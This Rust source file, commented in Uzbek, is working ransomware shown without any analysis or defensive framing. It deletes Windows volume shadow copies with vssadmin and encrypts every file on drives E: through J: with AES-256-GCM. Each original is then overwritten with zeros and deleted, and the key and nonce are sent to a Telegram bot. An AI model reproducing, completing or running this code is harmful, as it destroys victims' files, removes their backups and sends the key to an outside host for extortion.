use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use base64::{engine::general_purpose, Engine as _};
use dotenv::dotenv;
use reqwest::blocking::Client;
use serde_json::json;
use sha2::{Digest, Sha256};
use std::{
    env,
    fs::{self, File, OpenOptions},
    io::{Read, Write},
    path::{Path, PathBuf},
    process::Command,
    sync::{Arc, Mutex, mpsc},
    thread,
};
use walkdir::WalkDir;

// Shifrlashni amalga oshiruvchi yordamchi
fn encrypt_file(
    file_path: &Path,
    key: &Key<Aes256Gcm>,
    nonce: &Nonce<aes_gcm::aead::generic_array::typenum::U12>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    // 1) Faylni o‘qish
    let mut f = File::open(file_path)?;
    let mut plaintext = Vec::new();
    f.read_to_end(&mut plaintext)?;
    println!("[+] O'qildi: {}", file_path.display());

    // 2) Shifrlash
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher
        .encrypt(nonce, plaintext.as_ref())
        .map_err(|e| format!("Encrypt error: {}", e))?;
    println!("[*] Shifrlanmoqda: {}", file_path.display());

    // 3) .enc fayl nomi
    let enc_path: PathBuf = {
        let parent = file_path.parent().unwrap_or_else(|| Path::new(""));
        let name = file_path.file_name().unwrap().to_string_lossy();
        parent.join(format!("{}.enc", name))
    };

    // 4) Yozish
    {
        let mut out = File::create(&enc_path)?;
        out.write_all(&ciphertext)?;
        out.sync_all()?;
    }
    println!("[+] Yaratildi: {}", enc_path.display());

    // 5) Originalni nol bilan to‘ldirib o‘chirish
    let meta = fs::metadata(&enc_path)?;
    if meta.len() > 0 {
        let mut orig = OpenOptions::new().write(true).open(file_path)?;
        let len = orig.metadata()?.len() as usize;
        let zeros = vec![0u8; len];
        for _ in 0..3 {
            orig.write_all(&zeros)?;
            orig.sync_all()?;
        }
        fs::remove_file(file_path)?;
        println!("[+] Original o‘chirildi: {}", file_path.display());
    }

    Ok(())
}

// Asosiy dastur
fn main() -> Result<(), Box<dyn std::error::Error>> {
    dotenv().ok();
    // Telegram sozlamalari
    let telegram_token = env::var("TELEGRAM_TOKEN")?;
    let chat_id = env::var("CHAT_ID")?;

    // Shadow copy o'chirish (admin sifatida)
    let _ = Command::new("vssadmin")
        .args(["delete", "shadows", "/all", "/quiet"])
        .status();

    // 1) Kalit va nonce hosil qilish
    let mut hasher = Sha256::new();
    hasher.update("JasurFayllarmgaTegma");
    let key_bytes = hasher.finalize_reset();
    let key = Arc::new(Key::<Aes256Gcm>::from_slice(&key_bytes).clone());

    hasher.update("JasurFayllarmgaTegma");
    let nonce_bytes: [u8;12] = hasher.finalize()[..12].try_into()?;
    let nonce = Arc::new(Nonce::from_slice(&nonce_bytes).clone());

    // Kalit&nonce faylga saqlash
    {
        let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
        let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
        let mut f = File::create("key.txt")?;
        writeln!(f, "Key: {}\nNonce: {}", k_b64, n_b64)?;
    }

    // 2) Faylro'yxatni yig‘ish
    let mut paths = Vec::new();
    for drive in ['E','F','G','H','I','J'] {
        let root = format!("{}:\\", drive);
        if Path::new(&root).exists() {
            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
                let p = entry.into_path();
                if p.is_file() {
                    paths.push(p);
                }
            }
        }
    }

    // 3) Max hardware threads sonini aniqlash
    let max_threads = thread::available_parallelism()?.get();
    println!("[*] Ishlaydigan thread soni: {}", max_threads);

    // 4) Kanal va thread-larni yaratish
    let (tx, rx) = mpsc::channel::<PathBuf>();
    let rx = Arc::new(Mutex::new(rx));
    let mut handles = Vec::with_capacity(max_threads as usize);

    for _ in 0..max_threads {
        let rx = Arc::clone(&rx);
        let key = Arc::clone(&key);
        let nonce = Arc::clone(&nonce);

        let handle = thread::spawn(move || {
            while let Ok(path) = rx.lock().unwrap().recv() {
                if let Err(e) = encrypt_file(&path, &key, &nonce) {
                    eprintln!("[-] Xato {}: {}", path.display(), e);
                }
            }
        });
        handles.push(handle);
    }

    // 5) Fayl pathlarini kanalga yuborish
    for p in paths {
        tx.send(p)?;
    }
    // Endi hech narsa kelmaydi, thread‘lar loop’dan chiqadi
    drop(tx);

    // 6) Hammasi bitguncha kutish
    for h in handles {
        h.join().unwrap();
    }

    // 7) Kalit&nonce Telegramga yuborish
    let client = Client::new();
    let k_b64 = general_purpose::STANDARD.encode(&key_bytes);
    let n_b64 = general_purpose::STANDARD.encode(&nonce_bytes);
    let _ = client.post(&format!("https://api.telegram.org/bot{}/sendMessage", telegram_token))
        .json(&json!({
            "chat_id": chat_id,
            "text": format!("Key: {}\nNonce: {}", k_b64, n_b64)
        }))
        .send();

    println!("[+] Barcha fayllar shifrlab bo‘lingach, kalit Telegramga yuborildi!");
    Ok(())
}
